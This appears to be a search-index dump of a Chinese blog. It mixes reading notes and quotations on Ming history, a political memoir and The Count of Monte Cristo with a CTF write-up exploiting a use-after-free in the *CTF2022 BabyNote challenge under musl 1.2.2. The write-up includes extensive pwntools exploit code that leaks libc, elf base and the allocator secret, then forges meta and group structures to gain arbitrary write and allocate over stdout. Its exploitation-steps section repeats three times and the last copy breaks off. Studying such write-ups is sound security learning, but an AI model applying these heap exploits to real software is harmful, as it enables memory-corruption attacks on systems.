样自称自己是正义的人时，其实你并不配正义二字。你只有真正的在了解黑暗面，仍能保持初心后，你才能配得上正义，才能成为强大的人。想当个好人，首先要明白何为坏人！\rNote\r所以历史经验告诉我们，做人就不要内耗了，你在别人眼里什么样，主要取决于对方的立场，而不取决于你。\rNote\r变通是为了做事，不变通是为了做人。\rNote\r想到杨绛先生关于看书的一句话：小的时候看书是为了了解这个世界，长大后才发现不了解这个世界根本看不懂书。\rNote\r要允许亲人撞南墙，要看着朋友走弯路，要目送爱人踩深坑，因为疼痛是最好的老师，而说教是最毒的仇恨。费尽力气把经历伤痛的感悟传递，帮助别人尽可能少走弯路，别人却不能领悟，而是仇恨。\r","date":"2026-01-26","objectID":"/posts/read_mcnxse/:2:0","tags":null,"title":"《明朝那些事儿》","uri":"/posts/read_mcnxse/#他人批注"},{"categories":["reading"],"collections":null,"content":"感悟\r明朝，最有气节的一个朝代，不和亲，不赔款，不割地。天子守国门，君王死社稷。 看完之后，对“实现中华民族伟大复兴”有了更深刻的理解。对比明朝和清朝，大致也理解了“前人无能，把中国搞成这样”所指。明朝的火器水平世界领先，抗倭援朝对日本降维打击，别人在玩枪我们就玩炮了。 看完之后，我觉得最大的收获，大概是知道了自己想怎么活，想成为什么样的人。 记录一下让我印象深刻的部分人物： 王阳明，真正的圣贤，当之无愧。知行合一；“此心光明，亦复何言”；“天下之大，虽离家万里，何处不可往！何事不可为！”；“此心不动，随机而行。”；心如止水者，虽繁华纷扰之世间红尘，已然空无一物。 杨继盛，有种，实在太有种了。“他没有麻药，也不用铁环，更没有塞嘴的白毛巾，只是带着一副平静的表情，不停地刮着腐肉，碗片并不锋利，腐肉也不易割断，这是令人难以忍受的剧烈疼痛，然而，杨继盛没有发出一点儿声音”。“杨继盛继续着他的工作，腐肉已经刮得差不多了，骨头露了出来，他开始截去附在骨头上面的筋膜”。 杨涟，千年之下，终究不朽。不求钱财，不求富贵，不求青史留名，有慨然雄浑之气，万刃加身不改之志。 李时珍，见过最穷的贫民，也看过最富的天子，到过寒酸的茅舍，也走过金銮大殿，人世间的富贵、疾苦他已了然于胸。抛弃荣华富贵，历经困苦三十年著书救人的唯一动机与目的：“因为我本来就是个医生啊！” 于谦，身居高位却清廉正直，在这个污浊的世界上，能够干干净净的度过自己的一生 戚继光，少年时写下他的理想：小筑暂高枕，忧时旧有盟。呼樽来揖客，挥麈坐谈兵。云护牙签满，星含宝剑横。封侯非我意，但愿海波平。 收集一下金句： 庄子的儿子——庄（装）孙子 他只有两件事不会，这也不会，那也不会 八窍通了七窍——一窍不通 麻雀啄牛屁股——确实牛逼 铁哥们儿，也是会生锈的 无论是铁哥们儿，还是钛哥们儿，在利益面前，都是一脚蹬 最后再重复一遍书中的一句话：成功只有一个——按照自己的方式，去度过人生。 ","date":"2026-01-26","objectID":"/posts/read_mcnxse/:3:0","tags":null,"title":"《明朝那些事儿》","uri":"/posts/read_mcnxse/#感悟"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r生活在这个世界上的人：有的是弱者；有的是强者；有的要别人来设定目标，有的给别人设定目标；有的需要感情支持生活，有的需要意志支持生活。我大概在每一对概念中都会选择做后一种人。\rquote\r生活在今天的人，常常说前人无能，把中国搞成这样，我们希望以后的中国人不会说今天的中国人无能，把中国搞成这样。这是我最大的愿望。\rquote\r什么叫政治家？应该是具有至死不渝的信念、学贯中西的知识、高山仰止的人格、高瞻远瞩的目光、百折不挠的毅力、海纳百川的胸襟、纵揽全局的能力，等等。\rquote\r不少人讨论很多辩论技巧，但是没有意识到逻辑能力的重要意义，根本意义，这样不能有优秀的辩手。\rquote\r又加了一段写幽默和机智的文字。这些东西获得很不容易，一定要来自一种生活的态度，一种对生活超越的态度、认真的态度，或对生命道路的一种超脱的选择。这样才会有幽默，否则不能谈幽默。\rquote\r在这样的场合，人往往会有一种悲凉的感觉，越是热闹越是如此。从中感觉到自己生命的存在，感觉到世界是多么强大的外在力量，是可以不依人的感觉和情绪而存在的力量，是可以不依人的理性和理想而存在的力量。在平平淡淡的生活中，人们往往忘记了自己，觉得自己融入了社会和世界。但是，当世界沸腾起来时，才发现自己孤独安静的存在。\rquote\r社会就是这样的一种力量，使一个平凡的人突然在别人的眼中变得不平凡了。如果自己也认为是这样，就难以把握自己了。\rquote\r任何一种改革总是会在解决一些旧矛盾的同时，产生新矛盾。然后人们又要花力气来解决新矛盾。社会就是在这个过程中进步的。\rquote\r王沪宁也许不是一个均质的整体，而是一个变化的整体，他不断创新自我和消除自我。\rquote\r人总是一定时代的产物。\rquote\r人的生命总是要有寄托的，在失去了父母之后，你会突然觉得这样的寄托是重要的。\rquote\r中国社会的发展，慢慢人们也明白了道理，这样大的社会不可能一夜之间发生变革，变成一个全新的世界，而要逐渐地进步。在改革的设计上，也不能一下子就拿出整套的方案，而是要摸着石头过河。\rquote\r人往往会迷惑的，越集中精力越迷惑，有时散漫一些，反而不会糊涂。\rquote\r当一切美好都可以被金钱所调动，或者为金钱所驱动的时候，美好就不美好了。\rquote\r我突然感到自己不够坦诚。看问题也是这样，不是没有缺点的，问题是自己也要坦诚，不能自己都是优点，别人都是缺点。\rquote\r人，必须活得有自尊和骄傲。\rquote\r没有幸福的欲望，也就没有痛苦。痛苦往往是伴随着对幸福的追求的，而不是伴随着幸福本身。所以要怀疑的不是幸福本身，而是每个人主观状态中的希望。\rquote\r幸福之事，可欲而不可求，可求而不可执。\r这句话来自王教授的学生： quote\r人们看待一个有道德的人，透出的目光是亲切，看待一个有权力的人，透出的目光是敬畏，只有看待一个有知识的人，目光中才盈溢着无限的尊重，并饱含着由衷的敬佩。我向往那份尊重和敬佩。再有，我很欣赏书页中那一片于喧闹、复杂和浮噪之中仍可守的宁静的小天地。\rquote\r要注意确立自己在历史中的方位，这样才能更加深入地研究问题。\rquote\r学问之事，全在贡献于社会，清淡出自身，并不在乎别人如何说。\r“太阳都有人觉得他刺眼。总想让每一个人都满意，总害怕出现一点错误，这是幼稚的”。 quote\r在探索真理的过程中，最难的是否定自己所有的创见，不管他们曾给你带来什么荣誉，同时追求新的创见，不管它们会让你失去什么。\rquote\r快乐也好，害怕也好，生命总是要流失。要在生命流失的过程中，尽量地实现自己的理想和意志，完成人的选择，这将是有价值的生命。\r","date":"2026-01-13","objectID":"/posts/read_zzdrs/:1:0","tags":null,"title":"《政治的人生》","uri":"/posts/read_zzdrs/#摘录"},{"categories":["reading"],"collections":null,"content":"摘录\rQuote\r学过的东西，不一定是懂得的东西。有两种人，一种是书蠹，一种是学者：记忆造就前一种人，哲学造就后一种人\rQuote\r一个让人见了就伤心的人，你哪怕心肠再好，也不会总是去看他的\r“大家都喜欢正面的事情，负面的情绪，事件都会影响到自己，从而发现，自己的抱怨越来越多人懒得理，没人有空听你的事情。每个人都有生活上的不易，比你不易的，觉得你庸人自扰抱怨唉声叹气很没必要；比你稍微好一点的，感叹完你的不易之后会开始不理解你为什么不走出来，害怕你的难过，从而躲得远远的。要是以此认为世界，别人都很冷漠，确实，世界很冷漠，但不对的是，不要去憎恨责怪他人对你的无情，因为你本人也一样” Quote\r我们常常同快乐擦身而过，却对它视而不见；即使我们看到它而且注意到了它，可还是认不出它\rQuote\r时间和沉默，是治疗精神创伤的两帖药。\rQuote\r自知要比知人难得多，而知人要比自知有用得多。\rQuote\r然而，无论这份恩惠怎么珍贵，它还是没法跟我内心的满足相比的。\r《菜根谭》：“施恩者，内不见己，外不见人，则斗粟可当万钟之惠；利物者，计己之施，责人之报，虽百镒难成一文之功”。译文：施恩惠给别人的人，不可以将这种恩惠记在心上，更不应该存着让别人赞美的念头，这样即使是向别人布施了一斗米，也可以收到千万石米的回报；用财物帮助别人的人，如果总计较自己对别人的施舍，而且要求别人报答，这样即使是付出了一百镒，也难收到一文钱的功德。 Quote\r从总体上来研究人类，而您研究的是个体，每天接触的都是个案。我想，从整体到局部，要比从局部到整体容易得多。有一条代数公理告诉我们，应该由已知数来求未知数，而不该由未知数来求已知数……\rQuote\r您只看见机器在运转，而没看见驱使它运转的那位了不起的机械师。\rQuote\r我只有两个对手——是对手而不是征服者，因为凭我的坚忍，它们最终会向我屈服——那就是距离和时间。第三个对手是最可怕的，那就是凡人都难免的一死。只有死亡才能在我达到既定目标之前，使我停在前进的路上。\rQuote\r难道太阳为我做过什么事了吗？没有。它温暖了我，让我在阳光中见到了您，如此而已。难道花的香味为我做过什么事了吗？没有。但这香味唤起了我某种愉悦的感觉。\rQuote\r最奇妙的东西是什么呢？是我们无法懂得的东西。我们内心所向往的，又是什么东西呢？是我们无法拥有的东西。\rQuote\r我们的自私，往往会给属于自己的东西蒙上一层耀眼的光彩。\rQuote\r您只要把随便哪个国家的一个人研究透了，也就把这个种族完全弄明白了，道理是一样的。\rQuote\r生活中的许多事情都是碰运气的，所以幸福到了手边，就得一把抓住。\rQuote\r这世界的一大不幸就是每人都有自己的看法，而正是这种看法妨碍了我们去看清别人的看法\rQuote\r人有了信仰，就可以移动大山\rQuote\r一个人看到的景象是随心境而变的；您的心境很阴郁，所以您看到的是个彤云密布的天空。”\rQuote\r这就是人性中一种可怜的骄傲，每个人总以为自己比身边另一个在哭泣、呻吟的不幸的人更加不幸。\rQuote\r所有的幸福都是过眼云烟\rQuote\r这个世界上无所谓幸福，也无所谓不幸，有的只是一种境况和另一种境况的比较，如此而已。只有体验过极度不幸的人，才能品尝到极度的幸福。只有下过死的决心的人，马克西米利安，才会知道活着有多好。\rQuote\r让人见你自重，你就会被看重。\rQuote\r瘦弱的人爱说自己能挑重担，胆怯的人爱说怎么迎战巨人，穷人会夸口有金银财宝，就连最卑微的农夫，自吹自擂时也会自称是朱庇特。\rQuote\r您希望别人的自尊心对您作出让步，您就得先顾及对方的自尊心，保全他的面子，不让他为难。\rQuote\r死亡是什么？就是向安宁走近一步，就是向寂静走近也许两步。\rQuote\r一位法兰西学院院士说过，社交场上的晚会就好比花展，吸引着用情不专的蝴蝶、饥饿贪婪的蜜蜂和嗡嗡嘤嘤的大胡蜂。\rQuote\r人类的智慧就包含在这五个字里面：“等待和希望！”\rQuote\r其实，往事就如同旅途的景色，随着岁月的流逝，是会在记忆中淡忘的。我现在的情形，就好比那些在梦中受伤的人，他们看到了伤口也感到了疼痛，可就是想不起自己曾经受过伤。\r","date":"2026-01-13","objectID":"/posts/read_jdsbj/:1:0","tags":null,"title":"《基督山伯爵》","uri":"/posts/read_jdsbj/#摘录"},{"categories":["pwn"],"collections":null,"content":"看到hkcertctf出了一道musl的题来学习一下 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:0:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#"},{"categories":["pwn"],"collections":null,"content":"前言\r基础知识部分就不详细列出了，列出一些我的参考文章。其实主要还是看源码 io板子 源码分析 主要参考文章：小小做题家之musl1.2.2的利用手法 利用手法： dequeue：用于任意地址写 queue：把fake_meta链入active链表，从而进行任意地址的堆块分配 IO：有通过puts和exit触发的 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:1:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#前言"},{"categories":["pwn"],"collections":null,"content":"环境配置\r","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#环境配置"},{"categories":["pwn"],"collections":null,"content":"编译libc\r拿到题目的musl libc版本之后，最好自己编译一个musl libc，使用自己编译的libc启动题目有符号表能支持调试（有的题目给的libc没有符号表就调试不了），调试的时候还能看到musl的源码知道哪里出错了 Note\r查看musl libc版本： ./libc.so git clone https://github.com/kraj/musl.git cd musl git checkout v1.2.2 CFLAGS=\"-g -O0\" ./configure --prefix=$PWD/install make -j$(nproc) make install 这样musl/install/lib下就有没去符号表的libc.so ","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:1","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#编译libc"},{"categories":["pwn"],"collections":null,"content":"启动题目\rpatchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn 然后exp中直接 p = process(\"./pwn\") 即可 如果没有patchelf，通过 ./libc.so ./pwn 启动，会有点问题（虽然也不是不行） ","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#启动题目"},{"categories":["pwn"],"collections":null,"content":"调试\rsudo apt install musl-dbgsym git clone https://github.com/xf1les/muslheap.git echo \"source /path/to/muslheap.py\" \u003e\u003e ~/.gdbinit 命令 作用 mheap 可以查看__malloc_context的部分信息，可以详细看到每一条meta链表 p/x __malloc_context 可以查看__malloc_context的详细信息，但无法详细看到每一条meta链表 mmagic 用于查看关键函数的地址 p/x (struct meta) \u003cmeta地址\u003e 查看某个meta结构体的详细信息 p/x (struct group) \u003cgroup地址\u003e 查看group结构体详细信息 mchunkinfo 查看某个用户指针所属 slot 的详细信息 mfindslot 从任意地址反向定位其所在 slot p/x stdout 查看stdout结构体 p/x (struct meta_area) \u003cmeta_area address\u003e 查看meta_area，meta \u0026 0xffffffffffff000就能找到meta_arena结构体 Note\r后记 原来pwndbg中有调试musl的命令，pwndbg_docs\r","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:3","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#调试"},{"categories":["pwn"],"collections":null,"content":"*CTF（星CTF）——Babynote\rhttps://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote 逆向分析，略。。。 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#ctf星ctfbabynote"},{"categories":["pwn"],"collections":null,"content":"漏洞\radd的时候，把global_note给了heap_ptr[4]，delete的时候，没有把heap_ptr[4]中的global_note置0，存在UAF int __fastcall add(struct _IO_FILE *stderr) { __int64 *heap_ptr; // [rsp+8h] [rbp-8h] heap_ptr = (__int64 *)calloc(1u, 0x28u); heap_ptr[2] = create_name(heap_ptr); heap_ptr[3] = create_note(heap_ptr + 1); heap_ptr[4] = global_note; global_note = (__int64)heap_ptr; return puts(\"ok\"); } unsigned __int64 __fastcall delete(struct _IO_FILE *stderr) { // ... ptr_1 = 0; size = create_name((__int64 *)\u0026ptr_1); ptr = (void *)find_name(ptr_1, size); if ( ptr ) { if ( ptr != (void *)global_note || *(_QWORD *)(global_note + 0x20) )// 要删除的是中间或末尾节点 { if ( *((_QWORD *)ptr + 4) ) { // 遍历链表找到指向ptr的前一个节点的next指针位置 for ( p_global_note = \u0026global_note; ptr != (void *)*p_global_note; p_global_note = (__int64 *)(*p_global_note + 32) ) ; *p_global_note = *((_QWORD *)ptr + 4); // 更新前一个节点的next指针，从链表中移除ptr } } else { global_note = 0; // 要删除的是头节点且没有后继节点 } free(*(void **)ptr); // 释放name指针 free(*((void **)ptr + 1)); // 释放note_content指针 free(ptr); // 释放节点本身 puts(\"ok\"); } else { puts(\"oops.....\"); } free(ptr_1); // ... } ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:1","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#漏洞"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#流程"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#第一步"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 